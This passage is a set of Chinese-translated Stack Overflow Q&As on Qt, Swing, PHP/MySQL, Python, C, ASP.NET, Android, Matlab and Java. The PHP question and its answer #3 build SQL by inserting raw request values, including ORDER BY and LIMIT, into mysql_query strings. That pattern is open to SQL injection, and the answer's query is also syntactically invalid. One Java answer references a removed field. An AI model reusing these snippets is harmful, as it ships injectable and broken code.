        $(id1).fadeToggle(100, function(){$(id2).fadeToggle(100);});
} 
```

[**简单的演示**](http://jsfiddle.net/heera/pW943/1/)。

# qt - QDomDocument 无法设置带有标签的 HTML 文档的内容

> ID：11917936
> 
> 赞同：6
> 
> 时间：2012-08-11T21:50:11.663
> 
> 标签：qt, dom, html-parsing, doctype, qtxml

当我使用HTML 内容时，如果文档开头`QDomDocument`有 a，则无法设置内容。`<!doctype html>`但实际上为什么呢？！例如考虑以下代码片段：

```
 QDomDocument doc;
 QString content = "<!doctype html><html><body><a href='bar'>foo</a></body></html>";
 qDebug() << doc.setContent(content,false,0,0);
 QDomElement docElem = doc.documentElement();
 QDomNode a = docElem.firstChild();
 qDebug() << doc.childNodes().size() << docElem.childNodes().size(); 
```

`false`这段代码的输出只有一个 s 列表！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-12T00:14:14.437

HTML 是 HTML，XML 是 XML。因此，`Qt XML`无法正确解析 HTML 代码。要解析 HTML 文件，请考虑使用`Qt Webkit`模块而不是`Qt XML`模块。要将其包含在您的项目中，您只需添加`QT += webkit`到您的项目文件中。

要解析您的 HTML 数据，您必须执行以下操作：

```
QString content = "<html><body><a href='bar'>foo</a></body></html>";
QWebPage webPage;
QWebFrame * frame = webPage.mainFrame();
frame->setHtml(content);
QWebElement htmlElement = frame->documentElement();    // Equivalent of the QDomElement 
```

有关详细信息，请参阅[Qt Webkit 文档](http://qt-project.org/doc/qt-4.8/qtwebkit.html)和[QWebElement 文档](http://qt-project.org/doc/qt-4.8/qwebelement.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T22:55:22.903

使用可选参数来`setContent`找出解析错误是什么。它可能与“doctype”的情况一样简单。

# java - JPanel 从另一个类重绘

> ID：11917938
> 
> 赞同：1
> 
> 时间：2012-08-11T21:50:24.997
> 
> 标签：java, swing, drawing, jpanel, paintcomponent

我有一个显示图像的 JPanel。在一个单独的类中，我从一个 xml 文件点读取。我首先从这些点创建一个三角形数组列表。但是我需要在图像上显示三角形，即绘制它们！（是的，这应该很简单）。但是由于这些点和三角形是在另一个类中创建的，我似乎无法在 GUI 类中已经显示的图像上绘制它们。我尝试在 JPanel 本身中创建一个 ArrayList，我对其进行更新然后想要重新绘制，尽管它不会让我这样做，如下所示：

班级

```
triangles = clips.getTriangles();
tempPanel.setTriangles(triangles){ 
```

面板

```
 public void settriangles(ArrayList<Point[]> t){
 triangles = t;
 repaint();
} 
```

我唯一的另一个想法是让 JPanel 有一个侦听器等待返回三角形，更新字段，然后重新绘制。

有任何想法吗？

谢谢

编辑：绘图代码

```
public void settriangles(ArrayList<Point[]> t){
    triangles = t;
    repaint();
}

public void paintComponent(Graphics g) {

    System.out.println("in paint component");
if (g != null) {
    Graphics2D graphics = (Graphics2D) g;
    try {
        Rectangle back_rect = new Rectangle(0, 0, getWidth(),
                getHeight());
        graphics.setColor(GuiComponentGenerator.GUI_BACKGROUND_COLOUR);
        graphics.fill(back_rect);
        if (image != null) {
            int width = Math.round(image.getWidth() * magnification);
            int height = Math.round(image.getHeight() * magnification);
            Rectangle image_rect = new Rectangle(offset.x, offset.y,
                    width, height);
            graphics.setColor(Color.BLACK);
            graphics.draw(image_rect);
            graphics.drawImage(image, offset.x, offset.y, width,
                    height, null);
            graphics.setRenderingHint(RenderingHints.KEY_ANTIALIASING,
                    RenderingHints.VALUE_ANTIALIAS_ON);
            for(int pos = 0; pos < triangles.size(); pos++){
                Point[] current = triangles.get(pos);                   
                ArrayList<Point> current_triangle = new ArrayList<Point>();
                current_triangle.add(current[0]);
                current_triangle.add(current[1]);
                current_triangle.add(current[2]);
                drawRegion(graphics, current_triangle); 
            }
        }
    }

finally {
        graphics.dispose();
}
}

private void drawRegion(Graphics2D graphics, ArrayList<Point> points) {
    graphics.setColor(trans_grey);
    Area area = getArea(points);
    graphics.fill(area);
    graphics.setStroke(new BasicStroke(2));
    graphics.setColor(Color.BLACK);
    graphics.draw(area);
}

private Area getArea(ArrayList<Point> points) {
    Area area = new Area(getPath(points, true));
    return area;
}

private GeneralPath getPath(ArrayList<Point> points, boolean close_path) {
    GeneralPath path = new GeneralPath();
    Point current_screen_point = calculateScreenPoint(points.get(0));
    path.moveTo(current_screen_point.x, current_screen_point.y);
    for (int point_num = 1; point_num < points.size(); point_num++) {
        current_screen_point = calculateScreenPoint(points.get(point_num));
        path.lineTo(current_screen_point.x, current_screen_point.y);
    }
    if (close_path)
        path.closePath();
    return path;
}

public Point calculateScreenPoint(Point image_point) {
    float h_proportion = (float) image_point.x / (float) image.getWidth();
    float v_proportion = (float) image_point.y / (float) image.getHeight();
    float image_width_in_panel = (float) image.getWidth() * magnification;
    float image_height_in_panel = (float) image.getHeight() * magnification;

    Point on_screen_point = new Point(0, 0);
    on_screen_point.x = offset.x
            + Math.round(h_proportion * image_width_in_panel);
    on_screen_point.y = offset.y
            + Math.round(v_proportion * image_height_in_panel);
    return on_screen_point;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-12T04:24:33.493

你的`paintComponent`叶子有点不足；）

首先，除非该方法被正确调用，否则您永远不应该得到一个空图形`paint`，以防它们应该失败。

您应该尝试使用`Graphics.create`来创建传入`Graphics`上下文的副本。这使您可以在`Graphics`不影响原始属性的情况下弄乱属性（例如转换等）

我不知道它`image`是什么，但基本上，如果它`null`，你的三角形永远不会画（不知道这是否是你想要的）。

我不知道这与什么`offset`有关，但以防万一，0x0 点始终是组件的左上角。

![天空中的三角形](../Images/1168aa06ebd7ef4a223c1c3d5f03257b.png)

```
public void paintComponent(Graphics g) {

    // This is important, you will to have a very good reason not to call this
    super.paintComponent(g);

    System.out.println("in paint component");
    // Should never need this.  You should never call the paintComponent
    // directly.
    // if (g != null) {
    // Create a copy of the graphics, with which you can play...
    Graphics2D graphics = (Graphics2D) g.create();
    try {
        Rectangle back_rect = new Rectangle(0, 0, getWidth(),
                        getHeight());
        graphics.setColor(Color.GREEN);
        graphics.fill(back_rect);
        // What's this trying to do...
        // Where do you produce this???
        // Because I didn't know where the image was been produced
        // I commented out the code, but you should be aware
        // That if the image is null, you triangles will never paint...
//            if (image != null) {
//                int width = Math.round(image.getWidth() * magnification);
//                int height = Math.round(image.getHeight() * magnification);
//                
//                Rectangle image_rect = new Rectangle(offset.x, offset.y,
//                                width, height);
//                graphics.setColor(Color.BLACK);
//                graphics.draw(image_rect);
//                graphics.drawImage(image, offset.x, offset.y, width,
//                                height, null);
            graphics.setRenderingHint(RenderingHints.KEY_ANTIALIASING,
                            RenderingHints.VALUE_ANTIALIAS_ON);
            for (int pos = 0; pos < triangles.size(); pos++) {
                Point[] current = triangles.get(pos);
                ArrayList<Point> current_triangle = new ArrayList<Point>(3);
                current_triangle.add(current[0]);
                current_triangle.add(current[1]);
                current_triangle.add(current[2]);
                drawRegion(graphics, current_triangle);
            }
        //} // From the image != null
    } finally {
        graphics.dispose();
    }
} 
```

我还建议您通读

*   [2D 图形](http://docs.oracle.com/javase/tutorial/2d/index.html)
*   [在 Swing 中执行自定义绘画](http://docs.oracle.com/javase/tutorial/uiswing/painting/)

如果你还没有;)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T22:54:13.540

本文将为您提供所需的所有信息 [http://java.sun.com/products/jfc/tsc/articles/painting/](http://java.sun.com/products/jfc/tsc/articles/painting/)

但我认为你错过了 - super.paintComponent(g);

```
public class MyPanel extends JPanel {
    protected void paintComponent(Graphics g) {
    // Let UI delegate paint first 
    // (including background filling, if I'm opaque)
    super.paintComponent(g); 
    // paint my contents next....
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-28T11:19:01.957

当通过 arrayList 时，我研究了如何在图像上绘制三角形，其中每个 Point[] 代表三角形的点。

请注意，这现在是在传递信息的单个完整类中，而不是尝试从另一个类调用重绘。

```
public AnnotatedDisplayTriangles(BufferedImage image, String image_path, ArrayList<Point[]> triangles) {

    this.image = image;
    this.image_path = image_path;
    this.triangles = triangles;

}

protected void paintComponent(Graphics g) {
    super.paintComponent(g);
    // Draw image centered.
    int x = (getWidth() - image.getWidth())/2;
    int y = (getHeight() - image.getHeight())/2;
    g.drawImage(image, x, y, this);

    Stroke drawingStroke = new BasicStroke(2);
    Graphics2D graph = (Graphics2D)g;
    graph.setStroke(drawingStroke);
    graph.setPaint(Color.black);

    for(int p = 0; p < triangles.size(); p++){

        Point[] current_triangles = triangles.get(p);

        for(int triangle = 0; triangle < current_triangles.length; triangle++ ){

            Point current = current_triangles[triangle];
            Point next;
            if(triangle == current_triangles.length -1 )
                next = current_triangles[0];
            else
                next = current_triangles[triangle + 1];

            Line2D line = new Line2D.Double(current.x, current.y, next.x, next.y);
            graph.draw(line);

        }
    }
}

public static void main(String image_path,ArrayList<Point[]> triangles, String panel_name) throws IOException {
    String path = image_path;
    BufferedImage image = ImageIO.read(new File(path));
    AnnotatedDisplayTriangles contentPane = new AnnotatedDisplayTriangles(image, path, triangles);
    // You'll want to be sure this component is opaque
    // since it is required for contentPanes. Some
    // LAFs may use non-opaque components.
    contentPane.setOpaque(true);

    int w = image.getWidth();
    int h = image.getHeight();

    JFrame f = new JFrame(panel_name);
//  f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    f.setContentPane(contentPane);
    f.setSize(w,h);
    f.setLocation(200,200);
    f.setVisible(true);
} 
```

# php - PHP 和 MySQL 过滤多个表

> ID：11917943
> 
> 赞同：2
> 
> 时间：2012-08-11T21:51:43.490
> 
> 标签：php, jquery, mysql

我有 3 张桌子：

**用户**

*   ID
*   姓名

**类别**

*   ID
*   姓名

**帖子**

*   ID
*   标题
*   内容
*   用户身份
*   类别ID

我正在用 jquery 做一个过滤器（比如实时搜索）。具有多个字段的表单代表用于列出帖子的不同列。

```
<form onkeyup="filter()">

<input name="post_id" />
<input name="post_title" />
<input name="post_content" />
<input name="user_name" />
<input name="category_name" />

//order by column
<select name="col">
    <option value="post_id">post_id</option>
    <option value="post_title">post_title</option>
    <option value="post_content">post_content</option>
    <option value="user_name">user_name</option>
    <option value="category_name">category_name</option>
</select>

//direction
<select name="dir">
    <option value="DESC">DESC</option>
    <option value="ASC">ASC</option>
</select>

//limit number of results
<input name="lim"/>

</form> 
```

比我通过 jQuery 将这些值发布到将查询数据库的 .php 文件。

但是为了使用我拥有的类别名称或用户名或帖子表之外的任何其他值过滤“帖子”，我在帖子表中复制了这些列。目前我有这个查询：

```
$query = mysql_query("
SELECT *
FROM posts
WHERE id LIKE '%$id%'
AND title LIKE '%$title%'
AND content LIKE '%$content%'
AND user_id LIKE '%$user_id%'
AND user_name LIKE '%$user_name%'
AND category_id LIKE '%$category_id%'
AND category_name LIKE '%$category_name%'
ORDER BY $col $dir
$_lim
") or die (mysql_error()); 
```

比我返回这样的行：

```
while($post = mysql_fetch_assoc($query))
{
echo "<tr>";
echo    "<td>" . $post['id'] . "</td>";
echo    "<td>" . $post['title'] . "</td>";
echo    "<td>" . $post['content'] . "</td>";
echo    "<td>" . $post['category_name'] . "</td>";
echo    "<td>" . $post['user_name'] . "</td>";
echo "</tr>";
} 
```

如何进行在其他表中搜索的查询，这样我就不必在帖子表中复制列？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T21:54:26.403

为此使用 SQL JOIN，它将连接内存中的表而不复制它们。W3Schools 有一个很好的例子——Inner [Join](http://www.w3schools.com/sql/sql_join_inner.asp)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T22:01:32.757

另外，我不确定我是否理解清楚，但您目前只是在搜索帖子表，应该加入用户和类别。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-12T20:12:54.740

我已经使用类似这样的查询解决了这个问题：

```
SELECT posts.id, posts.title, posts.content, users.name, categories.name
FROM posts
LEFT JOIN users
ON posts.users_id = users.id
LEFT JOIN categories
ON posts.category_id = categories.id
WHERE posts.id LIKE '%$id%' OR
WHERE posts.title LIKE '%$title%' OR
WHERE posts.content LIKE '%$content%' OR
WHERE users.name LIKE '%$user_name%' OR
WHERE categories.name LIKE '%$category_name%' 
```

# python - 为什么我从随机选择函数中得到 IndexError？

> ID：11917944
> 
> 赞同：0
> 
> 时间：2012-08-11T21:51:50.010
> 
> 标签：python, random, markov

我正在尝试从初学者的 Python 书籍 Think Python 中运行[此代码，以对文本文件进行马尔可夫分析。](http://www.greenteapress.com/thinkpython/code/markov.py)当我运行作为解决方案提供的代码时，我得到一个 IndexError: List index out of range from the random.py 模块。我需要改变什么？

该代码应该是[Think Python](http://www.greenteapress.com/thinkpython/html/thinkpython014.html)中练习 8 的答案，但我无法让它工作。

追溯：

```
Traceback (most recent call last):
  File "test.py", line 115, in <module>
    main(*sys.argv)
  File "test.py", line 111, in main
    random_text(n)
  File "test.py", line 76, in random_text
    start = random.choice(suffix_map.keys())
  File "/Library/Frameworks/EPD64.framework/Versions/7.3/lib/python2.7/random.py", line 274, in choice
    return seq[int(self.random() * len(seq))]  # raises IndexError if seq is empty 
```

编辑：我在 .txt 文件上运行它。这是从古腾堡计划下载的一本书的文本。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T22:08:35.577

您正在运行程序的文件没有 Gutenberg 标头。它需要有一个开头的行：

```
*END*THE SMALL PRINT! 
```

只有之后的文本才会被读取（这发生在`skip_gutenberg_header`函数中）。例如，在文件上运行代码

```
Header info
*END*THE SMALL PRINT!

He was very clever, be it sweetness or be angry, ashamed or only amused, at such a stroke. She had never thought of Hannah till you were never meant for me?" "I cannot make speeches, Emma:" he soon cut it all himself. 
```

产生（作为一个例子）：

```
a stroke. She had never thought of Hannah till you were never meant for me?" "I cannot make speeches, Emma:" he soon cut it all himself. at such a stroke. She had never thought of Hannah till you were never meant for me?" "I cannot make speeches, Emma:" he soon cut it all himself. you were never meant for me?" "I cannot make speeches, Emma:" he soon cut it all himself. cannot make speeches, Emma:" he soon cut it all himself. be it sweetness or be angry, ashamed or only amused, at such a stroke. She had never thought of 
```

# c - 如何使用 C 从 Windows 获取可用磁盘空间？

> ID：11917946
> 
> 赞同：1
> 
> 时间：2012-08-11T21:52:08.917
> 
> 标签：c, windows

我有 1 个磁盘被分成多个分区。我想获得每个分区上的可用空间，以确定最好的文件放置位置。

我怎样才能在 C 中做到这一点？

我一直在尝试使用此代码：

```
__int64 lpFreeBytesAvailable, lpTotalNumberOfBytes, lpTotalNumberOfFreeBytes;
DWORD dwSectPerClust, dwBytesPerSect, dwFreeClusters, dwTotalClusters;

test = GetDiskFreeSpaceEx(
        pszDrive,
        (PULARGE_INTEGER)&lpFreeBytesAvailable,
        (PULARGE_INTEGER)&lpTotalNumberOfBytes,
        (PULARGE_INTEGER)&lpTotalNumberOfFreeBytes
        ); 
```

但结果不正确。

有任何想法吗 ？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T22:32:28.783

这对我来说很好：

```
 void main (int argc, wchar_t **argv)
   {
      BOOL  fResult;
      unsigned __int64 i64FreeBytesToCaller,
                       i64TotalBytes,
                       i64FreeBytes;
         fResult = GetDiskFreeSpaceEx (L"C:",
                                 (PULARGE_INTEGER)&i64FreeBytesToCaller,
                                 (PULARGE_INTEGER)&i64TotalBytes,
                                 (PULARGE_INTEGER)&i64FreeBytes);
         if (fResult)
         {
            printf ("\n\nGetDiskFreeSpaceEx reports\n\n");
            printf ("Available space to caller = %I64u MB\n",
                    i64FreeBytesToCaller / (1024*1024));
            printf ("Total space               = %I64u MB\n",
                    i64TotalBytes / (1024*1024));
            printf ("Free space on drive       = %I64u MB\n",
                    i64FreeBytes / (1024*1024));
         }
   } 
```

# c# - 数据绑定并尝试在 Listview 中获取索引

> ID：11917953
> 
> 赞同：1
> 
> 时间：2012-08-11T21:53:15.497
> 
> 标签：c#, asp.net

需要帮助我的旋转横幅在我的网站上正常工作。我正在使用管理旋转的 jquery 循环插件。在我的 CMS 中，我有一个叫做 smartform 的东西，它最多包含 6 张图片。下面的代码（我按照横幅教程编写的代码）运行良好。但是我想以某种方式获取图像的索引并将其放在 alt 标签中。我想要实现的是 alt 标签说“Banner_(ImageIndexNumber)”。

希望有人能帮忙，谢谢大家

C# 代码隐藏

```
private void BannerFill(int contentId)
{
    try
    {
        uxBannerContentBlock.DefaultContentID = contentId;
        uxBannerContentBlock.Fill();
        string xml = uxBannerContentBlock.EkItem.Html;

        SmartForm.RotatingBanner.BannerImage bannerGroup = (SmartForm.RotatingBanner.BannerImage)
        Ektron.Cms.EkXml.Deserialize(typeof(SmartForm.RotatingBanner.BannerImage), xml);

        List<BannerSlide> slides = GetBannerSlides(bannerGroup.Slides);

        //Databind//

        uxBannerRepeater.DataSource = slides;
        uxBannerRepeater.DataBind();
    }
    catch { }
}

protected List<BannerSlide>
    GetBannerSlides(SmartForm.RotatingBanner.BannerImageSlides[] bannerGroupSlides)
{
    List<BannerSlide> bSlides = new List<BannerSlide>();

    foreach (SmartForm.RotatingBanner.BannerImageSlides bgSlide in bannerGroupSlides)
    {

        bSlides.Add(new BannerSlide(bgSlide.Image.img.src));
    }

    return bSlides;
}

public class BannerSlide
{
    //properties//
    public string SlideImage { get; set; }

    //constructor//
    public BannerSlide(string slideImage)
    {
        SlideImage = slideImage;
    }
} 
```

前端

```
<div class="slideshow">
<CMS:ContentBlock ID="uxBannerContentBlock" runat="server" Visible="false" />
    <asp:Repeater runat="server" ID="uxBannerRepeater">
        <ItemTemplate>
            <img src="<%# DataBinder.Eval( Container.DataItem,"SlideImage")  %>" alt="Banner_<%# Container.ItemIndex %>" />
        </ItemTemplate>
    </asp:Repeater> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T21:58:16.560

```
alt='<%# "Banner_" + Container.ItemIndex %>' 
```

# c# - Windows Defrag.exe 上的实时 CMD 输出

> ID：11917954
> 
> 赞同：0
> 
> 时间：2012-08-11T21:53:27.597
> 
> 标签：c#, .net, visual-studio-2010, console, cmd

我正在尝试实时捕获 CMD 上的输出。我想阅读正在输出的每一行。以下是我的代码：

```
private void Defrag2()
    {
        string osDrive = Path.GetPathRoot(Environment.SystemDirectory);
        Process Psi = new Process();
        System.Text.Encoding SysEncoding = System.Text.Encoding.GetEncoding(System.Globalization.CultureInfo.CurrentUICulture.TextInfo.OEMCodePage);
        Psi.StartInfo = new ProcessStartInfo("cmd", @"/c defrag " + osDrive  + " /a /u")
        {
            UseShellExecute = false,
            RedirectStandardInput = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
            StandardOutputEncoding = SysEncoding,
            StandardErrorEncoding = SysEncoding

        };
        Psi.EnableRaisingEvents = true;
        Psi.OutputDataReceived += new DataReceivedEventHandler(OutPutDataRecieved);
        Psi.Start();
        Psi.BeginOutputReadLine();
    }

    void OutPutDataRecieved(object sender, DataReceivedEventArgs e)
    {
        this.DefStat(e.Data);
    }

    private void DefStat(string Line)
    {
        if (Line != null)
        {
            if (Line.Contains("do not need to def"))
            {
                defragstatustb.Invoke(new MethodInvoker(() => defragstatustb.Text = "You do not need to defrag this computer.")); 
            }
            if (defragRTB.InvokeRequired)
            { defragRTB.Invoke(new MethodInvoker(() => defragRTB.AppendText(Line + Environment.NewLine))); }
        }
    } 
```

该代码在实时捕获 CMD 输出方面效果很好，除非我尝试在 CMD 中运行 Windows Defrag。例如：如果我尝试输入像“Dir”这样的命令，它会实时读取输出，但是如果我尝试运行像“Defrag C: /f /u”这样的命令，它只会在完成后读取输出操作。

知道如何让它工作吗？谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T22:41:59.543

您需要使用多线程。创建一个新线程并将其传递给 Outputstream 处理程序，您就可以开始了。要测试是否需要多线程，请将其放在 DefWork 方法的开头：

```
MessageBox.Show(Line); 
```

# jquery - 从 mod_python 返回 xml 时 jQuery 中的 parseerror

> ID：11917955
> 
> 赞同：1
> 
> 时间：2012-08-11T21:53:38.710
> 
> 标签：jquery, python, ajax, mod-python

我正在尝试使用 jQuery 的 .ajax 从 Python 脚本返回 XML 数据：

```
<html><head>
  <script type="text/javascript" src="jquery-1.7.2.js"></script>
  <script type="text/javascript">
    $(document).ready(function() {
      $.ajax({
        type: "POST",
        url: "script.py/method",
        dataType: "xml",
        success: function(xml) { alert('Success!'); },
        error: function(request, error) { alert(error); }
      });
    });
   </script>
 </head><body></body></html> 
```

当我`script.py`没有返回任何警报显示`Success!`时，但只要我尝试添加一些 XML 数据，我得到的只是`parseerror`。我应该怎么做才能返回 XML 而不会出现 parseerror？

*script.py - 工作*

```
def method(req):
    req.content_type = 'text/xml'
    req.write('')  # Works! 
```

*script.py - 损坏*

```
def method(req):
    req.content_type = 'text/xml'
    req.write('<item>1</item><item>2</item>') # parserror! 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T21:56:28.207

您的 xml 无效，您缺少一个根节点（单个根节点），例如

```
def method(req):
    req.content_type = 'text/xml'
    req.write('<items><item>1</item><item>2</item></items>') 
```

# html - 从 MVC 中的 html 表单获取上传的文件？

> ID：11917958
> 
> 赞同：2
> 
> 时间：2012-08-11T21:54:42.860
> 
> 标签：html, asp.net-mvc

我有这个文件上传输入的一部分相当大的形式：

```
<input class="input-file" type="file" name="picture"> 
```

我在用：

```
public ActionResult Add(FormCollection form) 
```

要获取我的其余表单值，它也会在 FormCollection 中提供“图片”，但它只有文件名而不是实际图片。我试过用这个：

```
public ActionResult Add(FormCollection form, HttpPostedFile picture) 
```

还有这个

```
Request.Files[0] 
```

这是我在其他 SO 问题上找到的解决方案，但都为空。

我假设该文件实际上已发布，因为它显示在 FormCollection 中。

我怎样才能得到这个文件？试图将其作为 byte[] 保存在数据库中。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-12T03:18:09.563

我能够通过将表单的开头更改为：

```
@using (Html.BeginForm("Add","Recipe",FormMethod.Post, new { enctype = "multipart/form-data" })) 
```

# android - 为什么添加视图会动态倾斜我的布局？

> ID：11917960
> 
> 赞同：2
> 
> 时间：2012-08-11T21:54:51.453
> 
> 标签：android, layout

我有一个包含在 RelativeLayout 中的 LinearLayout。我正在动态添加视图（横幅广告），但这会扭曲我的布局：横幅将显示在屏幕中间，大部分内容视图消失？？？

注意：动态添加视图是 CustomEvent 类的一部分。这是不受支持的网络的 Admob 中介所必需的。当 Admob SDK 添加支持网络的横幅时，布局不会倾斜。

屏幕截图可以在这里找到：[https ://groups.google.com/forum/?hl=de&fromgroups#!topic/android-developers/I1w--u6fbvs%5B1-25%5D](https://groups.google.com/forum/?hl=de&fromgroups#!topic/android-developers/I1w--u6fbvs%5B1-25%5D)

这是有问题的代码：

```
 LinearLayout adContainer = (LinearLayout) activity.findViewById(R.id.ad_container);
    LinearLayout.LayoutParams params  = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.FILL_PARENT, 
            LinearLayout.LayoutParams.WRAP_CONTENT);
    adView.setLayoutParams(params);
    adContainer.addView(adView); 
```

这是布局xml：

```
<?xml version="1.0" encoding="utf-8"?>

<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:ads="http://schemas.android.com/apk/lib/com.google.ads"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:background="@drawable/layout_bg"
android:id="@+id/root_layout" >

  <LinearLayout 
      android:id="@+id/ad_container"
      android:orientation="vertical"
      android:layout_width="fill_parent"
      android:layout_height="wrap_content"></LinearLayout>

    <LinearLayout
    android:layout_below="@id/ad_container"
    android:id="@+id/linearLayout1"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content" >

    <ImageButton
        android:id="@+id/button_previous_day"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:src="@drawable/previous_saint_of_day" />

    <ImageButton
        android:id="@+id/button_previous_saint"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:src="@drawable/previous_saint" />

    <LinearLayout
        android:layout_width="0dp"
        android:layout_height="fill_parent"
        android:layout_weight="1"
        android:orientation="vertical" >

        <TextView
            android:id="@+id/text_view_date"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:gravity="center_horizontal"
            android:text="@string/date"
            android:textAppearance="?android:attr/textAppearanceMedium" />

        <TextView
            android:id="@+id/text_view_saint_count"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:gravity="center_horizontal"
            android:text="@string/saint_name"
            android:textAppearance="?android:attr/textAppearanceSmall" />
    </LinearLayout>

    <ImageButton
        android:id="@+id/button_next_saint"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:src="@drawable/next_saint" />

    <ImageButton
        android:id="@+id/button_next_day"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:src="@drawable/next_saint_of_day" />
</LinearLayout>

<TextView
    android:id="@+id/text_view_name"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:gravity="center_horizontal"
    android:text="Medium Text"
    android:layout_below="@id/linearLayout1"
    android:textAppearance="?android:attr/textAppearanceMedium" />

<WebView
    android:id="@+id/web_engine"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:layout_below="@id/text_view_name" /> 

<com.socialize.ui.actionbar.ActionBarView
    android:id="@id/socializeActionBar"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true" />

</RelativeLayout> 
```

有什么建议么？

# matlab - matlab是否有嵌套多项式求值函数（horners算法）

> ID：11917961
> 
> 赞同：2
> 
> 时间：2012-08-11T21:55:14.587
> 
> 标签：matlab

我最近一直在对多项式进行一些工作，以基本形式评估它们，我认为这可能效率低下且数值不稳定。我遇到了霍纳的算法，我认为这是一种优于我目前正在做的方法的方法。我打算自己编写代码，但我想我会先在这里问Matlab是否有任何内置函数可以做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-12T00:03:59.543

Matlab 使用 Horner 的算法来评估[POLYVAL](http://www.mathworks.com/help/techdoc/ref/polyval.html)中的多项式（该算法被实现为数字滤波器，因为如果多项式被评估为标量输入，请参阅[此 Mathworks 博客文章](http://blogs.mathworks.com/loren/2009/07/08/a-brief-history-of-polyval/)- 谢谢，Ramashalanka！）。

多项式 4x^3+3 表示为`[4 0 3]`，并且可以针对 x 的值（或值数组）进行评估，如下所示：

```
polyval([4 0 3],1)
ans =
   7 
```

# java - 从集合中找到二维点之间的最短路径

> ID：11917970
> 
> 赞同：0
> 
> 时间：2012-08-11T21:55:56.353
> 
> 标签：java, android, algorithm

我的场景中有一个二维点列表，并且这些点之间的连接数组存储为无序对

Pair 的定义与此处完全相同，[如何在 Java 中为无序对编写一个集合](https://stackoverflow.com/questions/8905528/how-to-write-write-a-set-for-unordered-pair-in-java)

所以我有 ：

```
ArrayList<PointF> mPoints = new ArrayList<PointF>();

ArrayList<Pair<PointF>> mConnections = new ArrayList<Pair<PointF>>();

//
PointF mStartPoint = mPoints.get(0);
PointF mEndPoint = mPoints.get(80); 
```

我需要找到将我从源点引导到目标点的点数组。

我想为每对添加有关距离的信息，但接下来呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T21:59:16.310

[这是标准路径查找问题](http://en.wikipedia.org/wiki/Pathfinding)的一个实例。

如果您需要有保证的精确解决方案，请使用[Dijkstra's algorithm 之](http://en.wikipedia.org/wiki/Dijkstra%27s_algorithm)类的方法。如果您需要更高效的方法，但在某些情况下可以接受次优解决方案，请使用[A* 算法](http://en.wikipedia.org/wiki/A%2a)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T22:00:39.077

有关解决方案，请参阅[http://en.wikipedia.org/wiki/Dijkstras_algorithm#Algorithm](http://en.wikipedia.org/wiki/Dijkstras_algorithm#Algorithm)。

# java - 这个子类如何与主类交互

> ID：11917974
> 
> 赞同：0
> 
> 时间：2012-08-11T21:56:53.090
> 
> 标签：java

我被一个模拟考试问题困住了。我创建了一个名为的类`Power`，它允许将数字提升到任何幂。

问题的第三部分要求我创建另一个`BoundedPower`可以扩展的类`Power`。我得到了`MAX-X`变量（x 不能超过这个值），并告诉我这个`BoundedPower`类必须：表现得像`Power`类，使用构造函数并使用`powN`方法。

我的代码在下面，我不知道该怎么做才能使`BoundedPower`课程正常工作。

```
public class Power {

    private double x = 0;

    Power(double x) {
        this.x = x;
    }

    public double getX() {
        return x;
    }

    public double powN(int n) {

        double result = 1.0;
        for (int i = 0; i < n; i++) {
            result = result * x;
        }
        return result;

    }

    public static void main(String[] args) {

        Power p = new Power(5.0);
        double d = p.powN(3);
        System.out.println(d);
    }

}

public class BoundedPower extends Power {

    public static final double MAX_X = 1000000;

    // invariant: x <= MAX_X

    Power x;

    BoundedPower(double x) {
        super(x);
        // this.x=x; x is private in Power class

    }

    public double powN(int n) {

        if (x.getX() > MAX_X) {

            return 0;
        } else {

            double result = 1.0;
            for (int i = 0; i < n; i++) {
                result = result * getX();
            }
            return result;
        }
    }

    public static void main(String[] args) {

        BoundedPower bp = new BoundedPower(5);
        double test = bp.powN(4);
        System.out.println(test);
    }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T22:00:20.263

您的类中不需要该实例 Power 变量 x 。任何 BoundedPower 实例都是 Power 实例，因此，要从 Power 中引用方法，请执行 super.blah()，因此对于 x.getX()，请执行 super.getX()

另外，在您的评论中，您说 this.x=x 失败，因为它是私有的。当你进行 super 调用时，它会调用超类 (Power) 的构造函数，它在那里设置 x，因此不需要 this.x=x

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T22:05:40.690

```
public class BoundedPower extends Power {

  public static final double MAX_X = 1000000;

  BoundedPower(double x) {
    super(x);
  }

   public double powN(int n) {

     if (x.getX() > MAX_X) {
      return 0;
     } else {
      return super.powN(n);
     }
   }

